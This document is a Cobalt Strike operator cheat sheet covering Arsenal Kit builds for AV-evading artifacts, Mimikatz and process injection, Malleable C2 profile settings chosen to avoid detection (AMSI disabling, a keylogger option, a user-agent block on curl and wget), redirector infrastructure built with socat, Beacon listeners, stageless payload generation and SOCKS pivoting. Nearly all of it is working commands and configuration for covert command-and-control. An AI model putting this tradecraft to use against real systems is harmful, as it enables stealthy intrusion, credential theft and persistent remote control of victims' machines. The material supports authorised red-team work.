# Install and Arsenal Kit

## Overview

Install under /opt/cobaltstrike/ so misc/update.sh can pull third-party repos and BOFs.

## Commands

Update:
    cd /opt/cobaltstrike/
    ./update

Arsenal Kit — https://download.cobaltstrike.com/scripts

Includes:
    Artifact Kit — source framework for executables and DLLs that evade some AV products
    Mimikatz Kit
    Process Injection Kit
    Resource Kit
    Sleep Mask Kit
    User Defined Reflective Loader Kit

Not included:
    Applet Kit
    Elevate Kit
    Power Applet Kit
    Sleep Mask Kit (version 4.4)

Build and install:
    cd /home/kali/Downloads/
    tar -zxf arsenal-kitYYYYMMDD.tgz
    cd arsenal-kit/
    vi arsenal_kit.config                          # make the following changes
    include_udrl_kit="true"
    include_sleepmask_kit="true"
    include_process_inject_kit="true"
    include_resource_kit="true"
    include_mimikatz_kit="true"
    ./build_arsenal_kit.sh
    cd ..
    mv arsenal-kit /opt/cobaltstrike/


# Malleable C2 Profile

## Overview

OPSEC: always use a Malleable C2 profile. Generate with SourcePoint or C2concealer, then validate with c2lint.

## Commands

Option 1 — SourcePoint:
    cd /opt/cobaltstrike/tylous-sourcepoint/
    go build SourcePoint.go
    ./SourcePoint -Host <IP> -Injector VirtualAllocEx -Outfile <name>.profile

Option 2 — C2concealer:
    cd /opt/cobaltstrike/RedSiege-C2concealer/
    chmod 755 install.sh
    ./install.sh
    C2concealer --variant 3 --hostname <redirector domain>
    # answer the questions; creates a random profile

Validate:
    ./c2lint <new profile>

Reference profiles:
    /opt/cobaltstrike/malleable-c2-profiles/normal/reference.profile

Further reading:
    https://thedfirreport.com/2021/08/29/cobalt-strike-a-defenders-guide/
    https://blog.zsec.uk/cobalt-strike-profiles/

## Validation / False Positives

c2lint errors block team server startup with that profile — fix syntax before deploying.
Profiles tuned for one redirector domain may fail on backup listeners — align host headers and cert CN.


# C2 Profile OPSEC Settings

## Overview

If you manually edit a profile, change defaults that fingerprint Cobalt Strike in network and host telemetry.

## Commands

    set host_stage          "false";
    set pipename            "changeme_###";        # default SMB Beacon named pipe is msagent_###
    set pipename_stager     "changeme_##";         # default is status_##
    set ssh_banner          "changeme";            # default SSH banner is Cobalt Strike 4.2
    set ssh_pipename        "changeme_####";       # default SSH Beacon named pipe is postex_ssh_####

    http-config {
         set headers "Date, Server, Content-Length, Keep-Alive, Connection, Content-Type";
        header "Server" "Apache";
        header "Keep-Alive" "timeout=10, max=100";
        header "Connection" "Keep-Alive";
        set trust_x_forwarded_for "true";
        set block_useragents "curl*,lynx*,wget*";
    }

    https-certificate {
        set CN "changeme.com";
        set O "Changeme";
        set L "Changeme";
        set ST "Changeme";
        set C "US";
        set validity "365";
    }

    post-ex {
        set spawnto_x86      "%windir%\\syswow64\\dllhost.exe";
        set spawnto_x64      "%windir%\\sysnative\\dllhost.exe";
        set obfuscate        "true";
        set smartinject      "true";
        set amsi_disable     "true";
        set pipename         "changeme_####, win\\changeme_##";
        set keylogger        "GetAsyncKeyState";
        set threadhint       "module!function+0x##"
    }

    process-inject {
        set allocator        "NtMapViewOfSection";
        set min_alloc        "17500";
        set startrwx         "false";
        set userwx           "false";

        transform-x64 {
            prepend "\x90\x90";
        }
    }

    stage {
        set userwx           "false";
        set cleanup          "true";
        set stomppe          "true";
        set obfuscate        "true";
        set name             "changeme.dll";
    }


# Team Server

## Overview

Run the team server in a screen session with your Malleable C2 profile and optional Beacon kill date.

## Commands

    screen -S <name>

Parameters in <> are mandatory; those in [] are optional:
    sudo ./teamserver <team server IP> <password> [Malleable C2 profile] [kill date for Beacons yyyy-mm-dd]

Example:
    sudo ./teamserver <team server IP> <password> RedSiege-C2concealer/random.profile <yyyy-mm-dd>

When the team server starts, it displays the SHA256 hash of the SSL cert.
Share this hash with teammates and have them validate the hash when connecting.

Remove old data and Beacons (optional):
    # stop the team server first
    rm -rf data/

## Validation / False Positives

Teammates connecting without fingerprint verification are vulnerable to MITM on port 50050 — always compare SHA256.
Kill date silently stops new check-ins after the date — confirm engagement window before setting.


# Client Connection

## Overview

Connect the Cobalt Strike client locally or over SSH port forward. Never expose port 50050 to the internet.

## Commands

Local:
    # right-click in the Terminal > Split Terminal Horizontally
    cd /opt/cobaltstrike/
    ./cobaltstrike
    Host: 127.0.0.1
    Port: 50050
    User: <your name>
    Password: <password you entered above>
    Connect
    Verify Fingerprint (SHA256 hash from above) > Yes

Remote — OPSEC: use SSH local forward, not direct 50050:
    ssh -f -N -L 50050:127.0.0.1:50050 <user>@<team server IP>
    # follow the local steps above


# Redirectors

## Overview

OPSEC: never allow a Beacon to connect directly to the team server. Forward C2 through redirectors.

## Commands

Create 3 free Ubuntu instances in the cloud:
    Redirector 1 — <domain> (primary HTTPS)
    Redirector 2 — <domain2> (backup HTTPS)
    Redirector 3 — <domain3> (DNS long haul)

Apache mod_rewrite — preferred redirector method.

socat (not OPSEC friendly) — forwards all traffic on these ports:
    sudo -i
    apt install -y socat
    screen -S <name>
    socat tcp4-listen:443,fork tcp4:<team server IP>:443
    socat tcp4-listen:443,fork tcp4:<team server IP>:4443
    socat -T 5 udp4-listen:53,fork udp4:<team server IP>:53

SSL certificates for HTTPS redirectors:
    # Java Keystore — use the FQDN of your Beacon server
    keytool -genkey -keyalg RSA -keysize 2048 -keystore <domain>.store
    keytool -certreq -keyalg RSA -file <domain>.csr -keystore <domain>.store
    # submit CSR to your SSL vendor; import root and intermediate certs:
    keytool -import -trustcacerts -alias FILE -file FILE.crt -keystore <domain>.store
    keytool -import -trustcacerts -alias mykey -file <domain>.crt -keystore <domain>.store

Cobalt Strike expects the keystore in the Malleable C2 profiles folder:
    /opt/cobaltstrike/malleable-c2-profiles

Automate infrastructure:
    https://github.com/ezra-buckingham/terry-the-terraformer

## Overview

Primary and backup HTTPS listeners, DNS long haul, and SMB peer-to-peer chaining for hosts without direct egress.

## Commands

    Click headphones > Add
    Name: https_primary
    Payload: Beacon HTTPS
    HTTPS Hosts: <domain>
    HTTPS Host (Stager): <domain>
    Profile: Primary
    HTTPS Port (C2): 443
    Save

Backup HTTPS listener:
    Click Add
    Name: https_backup
    Payload: Beacon HTTPS
    HTTPS Hosts: <domain2>
    HTTPS Host (Stager): <domain2>
    Profile: Backup
    HTTPS Port (C2): 443
    HTTPS Port (Bind): 4443
    Save

DNS listener:
    Click Add
    Name: dns
    Payload: Beacon DNS
    DNS Hosts: <domain3>
    DNS Host (Stager): <domain3>
    Save

DNS records at your domain registrar (per redirector):
    https            A    <redirector IP>
    dns       @      A    <redirector IP>
    dns       ns1    A    <redirector IP>
    dns       data   NS   <domain3>.

SMB listener:
    Click Add
    Name: smb
    Payload: Beacon SMB
    # blend pipename with target environment — find examples on a similar Windows VM:
    [System.IO.Directory]::GetFiles("\\.\\pipe\\")
    Save

Peer-to-peer listeners chain Beacons over SMB or TCP when the target cannot reach the team server over HTTP/S.
In graph mode, SMB Beacons are yellow and TCP Beacons are green.


# Payload Generation

## Overview

OPSEC: staged payloads tend to have more indicators than stageless. Prefer stageless (S) payloads and disable payload staging in your Malleable C2 profile.

## Commands

When testing at home, disable Windows Defender on your target Windows VM:
    Enterprise: Windows Security > Virus & threat protection > Manage settings > turn off Real-time protection > Yes
    Standard: Windows Defender settings > turn off Real-time protection
    # also disable automatic sample submission

Scripted Web Delivery (stageless):
    Attacks > Scripted Web Delivery (S)
    URI Path: /a
    Listener: select the https listener > Choose
    Type: exe
    x64: Use x64 payload
    Launch > OK

Transfer the payload to your target and execute.
A Beacon session appears in the top pane when check-in succeeds.

## Validation / False Positives

No Beacon after execution — View > Web Log and confirm HTTP/S requests reach the team server.
Staged payloads when host_stage is false — mismatch between listener stager host and profile causes silent failure.

    Payloads > Windows Stageless Payload

    Output: Raw
    x64: Use x64 payload
    Generate > Save > OK

# Beacon Interaction

## Overview

Interact with a Beacon session, adjust sleep, manage jobs, and review OPSEC guidance.

## Commands

    Right-click on a Beacon > Interact
    helpx                                                OPSEC color coded commands
    help <command>                                       Get more help on a particular command
    ctrl +/-                                             Increase or decrease the font size
    ctrl k                                               Clear the window

By default, Beacon checks in every 60 seconds.
    sleep 10                                             Set Beacon sleep time to 10 seconds
    sleep 20 10                                          Set Beacon sleep time to 20 seconds with a 10% jitter (18-22s)
    sleep 0                                              Make a Beacon interactive

Jobs:
    jobs                                                 List long-running post-exploitation tasks
    kill <JID>                                           Kill a process

Misc:
    Beacon is fully tab-completable.
    Use the up arrow to scroll through previous commands.
    All commands and their output are written to the logs directory.
    Right-click on the X in the tab for additional options.
    https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/appendix-a_beacon-opsec-considerations.htm

    Select a particular Beacon > exit                    Beacon will no longer check in
    Right-click on the Beacon > Session > Remove         Remove dead Beacon

# SOCKS Proxy

## Overview

Pivot additional traffic and tools into the network through the team server via proxychains.

## Commands

    sleep 0                                              Make a Beacon interactive
    socks <port>                                         Start a SOCKS4a proxy server on the team server with proxychains (example 8080)
    /etc/proxychains4.conf                               Edit your attack VM's config at the bottom with the team server IP and proxy port
    proxychains <tool/options>
    proxychains xfreerdp /u:<domain\user> /p:<password> /v:<IP>
    socks stop                                           Stop the proxy
